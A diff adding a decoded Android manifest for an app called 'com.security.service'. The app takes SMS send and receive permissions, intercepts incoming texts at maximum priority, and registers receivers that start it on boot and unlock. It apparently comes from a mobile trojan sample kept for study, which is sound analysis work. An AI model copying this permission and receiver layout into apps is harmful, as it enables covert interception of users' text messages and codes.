@@ -1,0 +1,52 @@
+manifest
+- installLocation: 1
+- package: com.security.service
+- versionName: 1.0
+- versionCode: 1
+	uses-permission
+	- name: android.permission.RECEIVE_SMS
+	uses-permission
+	- name: android.permission.SEND_SMS
+	uses-sdk
+	- minSdkVersion: 4
+	- targetSdkVersion: 16
+	application
+	- icon: 2130837505
+	- theme: 2131099648
+	- label: 2131034112
+	- debuggable: true
+		activity
+		- name: com.security.service.MainActivity
+		- theme: 2131099649
+			intent-filter
+				category
+				- name: android.intent.category.LAUNCHER
+				action
+				- name: android.intent.action.MAIN
+		receiver
+		- name: com.security.service.receiver.ActionReceiver
+		- permission: android.permission.RECEIVE_BOOT_COMPLETED
+		- enabled: true
+			intent-filter
+				category
+				- name: android.intent.category.HOME
+				action
+				- name: android.intent.action.BOOT_COMPLETED
+				action
+				- name: android.intent.action.USER_PRESENT
+		receiver
+		- name: com.security.service.receiver.SmsReceiver
+		- enabled: true
+			intent-filter
+			- priority: 2147483647
+				action
+				- name: android.provider.Telephony.SMS_RECEIVED
+		receiver
+		- name: com.security.service.receiver.RebootReceiver
+		- permission: android.permission.REBOOT
+		- enabled: true
+			intent-filter
+				action
+				- name: android.intent.action.REBOOT
+				action
+				- name: android.intent.action.ACTION_SHUTDOWN
